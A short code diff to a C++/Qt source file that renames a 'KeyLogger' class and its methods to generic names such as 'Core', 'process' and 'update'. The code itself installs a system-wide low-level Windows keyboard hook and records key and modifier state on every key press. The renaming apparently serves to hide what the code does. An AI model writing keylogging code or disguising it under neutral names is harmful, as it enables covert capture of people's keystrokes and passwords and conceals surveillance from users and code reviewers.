@@ -1,19 +1,19 @@
-#include "keylogger.h"
+#include "core.h"
 
 static HHOOK hHook = nullptr;
 
-KeyLogger::KeyLogger(QObject *parent) :
+Core::Core(QObject *parent) :
     QObject(parent)
 {
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, nullptr, 0);
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, process, nullptr, 0);
 }
 
-void KeyLogger::updateKeyState(BYTE *keyState, int keyCode)
+void Core::update(BYTE *keyState, int keyCode)
 {
     keyState[keyCode] = BYTE(GetKeyState(keyCode));
 }
 
-LRESULT CALLBACK KeyLogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);
@@ -22,10 +22,10 @@ LRESULT CALLBACK KeyLogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         BYTE keyboardState[256];
         GetKeyboardState(keyboardState);
 
-        updateKeyState(keyboardState, VK_SHIFT);
-        updateKeyState(keyboardState, VK_CAPITAL);
-        updateKeyState(keyboardState, VK_CONTROL);
-        updateKeyState(keyboardState, VK_MENU);
+        update(keyboardState, VK_SHIFT);
+        update(keyboardState, VK_CAPITAL);
+        update(keyboardState, VK_CONTROL);
+        update(keyboardState, VK_MENU);
 
         HKL keyboardLayout = GetKeyboardLayout(0);
         char lpszName[0x100] = {0};
